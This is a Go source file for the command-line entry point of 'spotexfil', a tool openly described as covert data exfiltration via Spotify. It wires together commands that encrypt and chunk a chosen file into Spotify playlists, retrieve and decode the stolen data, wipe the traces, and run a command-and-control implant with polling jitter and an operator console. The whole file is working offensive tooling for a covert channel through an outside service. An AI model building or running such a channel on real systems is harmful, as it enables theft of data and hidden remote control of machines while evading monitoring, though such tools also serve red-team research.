// Package main provides the spotexfil CLI.
package main

import (
	"context"
	"fmt"
	"os"

	"github.com/sourcefrenchy/spotexfil/internal/c2"
	"github.com/sourcefrenchy/spotexfil/internal/encoding"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
	"github.com/sourcefrenchy/spotexfil/internal/spotify"
	"github.com/spf13/cobra"
)

var version = "1.0.0"

func main() {
	rootCmd := &cobra.Command{
		Use:   "spotexfil",
		Short: "SpotExfil: covert data exfiltration via Spotify",
	}

	rootCmd.AddCommand(
		sendCmd(),
		receiveCmd(),
		cleanCmd(),
		c2ImplantCmd(),
		c2OperatorCmd(),
		versionCmd(),
	)

	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}

func sendCmd() *cobra.Command {
	var file, key string
	var noCompress, legacyNames bool

	cmd := &cobra.Command{
		Use:   "send",
		Short: "Exfiltrate a file",
		RunE: func(cmd *cobra.Command, args []string) error {
			cfg, err := spotify.LoadConfig()
			if err != nil {
				return err
			}

			client, err := spotify.NewClient(cfg, !legacyNames)
			if err != nil {
				return err
			}

			ctx := context.Background()

			// Clear existing data
			if err := client.DeleteChunks(ctx); err != nil {
				return err
			}

			// Encode payload
			payload, err := encoding.EncodePayload(file, key, !noCompress)
			if err != nil {
				return err
			}

			// Write chunks
			return client.WriteChunks(ctx, payload)
		},
	}

	cmd.Flags().StringVarP(&file, "file", "f", "", "Path to the file to exfiltrate")
	cmd.Flags().StringVarP(&key, "key", "k", "", "Encryption passphrase for AES-256-GCM")
	cmd.Flags().BoolVar(&noCompress, "no-compress", false, "Disable gzip compression")
	cmd.Flags().BoolVar(&legacyNames, "legacy-names", false, "Use N-payloadChunk naming")
	cmd.MarkFlagRequired("file")

	return cmd
}

func receiveCmd() *cobra.Command {
	var key, output string

	cmd := &cobra.Command{
		Use:   "receive",
		Short: "Retrieve exfiltrated data",
		RunE: func(cmd *cobra.Command, args []string) error {
			cfg, err := spotify.LoadConfig()
			if err != nil {
				return err
			}

			client, err := spotify.NewClient(cfg, true)
			if err != nil {
				return err
			}

			ctx := context.Background()

			// Retrieve chunks
			payload, err := client.ReadChunks(ctx)
			if err != nil {
				return err
			}

			// Decode payload
			decoded, err := encoding.DecodePayload(payload, key)
			if err != nil {
				return err
			}

			if len(decoded) == 0 {
				return fmt.Errorf("no data decoded")
			}

			if output != "" {
				return os.WriteFile(output, decoded, 0644)
			}

			// Try text output, fall back to binary file
			fmt.Print(string(decoded))
			return nil
		},
	}

	cmd.Flags().StringVarP(&key, "key", "k", "", "Decryption passphrase")
	cmd.Flags().StringVarP(&output, "output", "o", "", "Output file path")

	return cmd
}

func cleanCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "clean",
		Short: "Remove all payload playlists",
		RunE: func(cmd *cobra.Command, args []string) error {
			cfg, err := spotify.LoadConfig()
			if err != nil {
				return err
			}

			client, err := spotify.NewClient(cfg, true)
			if err != nil {
				return err
			}

			return client.DeleteChunks(context.Background())
		},
	}
}

func c2ImplantCmd() *cobra.Command {
	var key string
	var interval, jitter int

	cmd := &cobra.Command{
		Use:   "c2-implant",
		Short: "Run C2 implant",
		RunE: func(cmd *cobra.Command, args []string) error {
			cfg, err := spotify.LoadConfig()
			if err != nil {
				return err
			}

			client, err := spotify.NewClient(cfg, true)
			if err != nil {
				return err
			}

			implant := c2.NewImplant(client, key, interval, jitter)
			implant.Run()
			return nil
		},
	}

	cmd.Flags().StringVarP(&key, "key", "k", "", "Encryption passphrase")
	cmd.Flags().IntVar(&interval, "interval", shared.Proto.C2.DefaultInterval, "Polling interval (seconds)")
	cmd.Flags().IntVar(&jitter, "jitter", shared.Proto.C2.DefaultJitter, "Jitter range (seconds)")
	cmd.MarkFlagRequired("key")

	return cmd
}

func c2OperatorCmd() *cobra.Command {
	var key string

	cmd := &cobra.Command{
		Use:   "c2-operator",
		Short: "Run C2 operator console",
		RunE: func(cmd *cobra.Command, args []string) error {
			cfg, err := spotify.LoadConfig()
			if err != nil {
				return err
			}

			client, err := spotify.NewClient(cfg, true)
			if err != nil {
				return err
			}

			operator := c2.NewOperator(client, key)
			operator.Interactive()
			return nil
		},
	}

	cmd.Flags().StringVarP(&key, "key", "k", "", "Encryption passphrase")
	cmd.MarkFlagRequired("key")

	return cmd
}

func versionCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "version",
		Short: "Print version information",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Printf("spotexfil %s (Go)\n", version)
			fmt.Printf("Protocol version: %d\n", shared.Proto.Version)
		},
	}
}
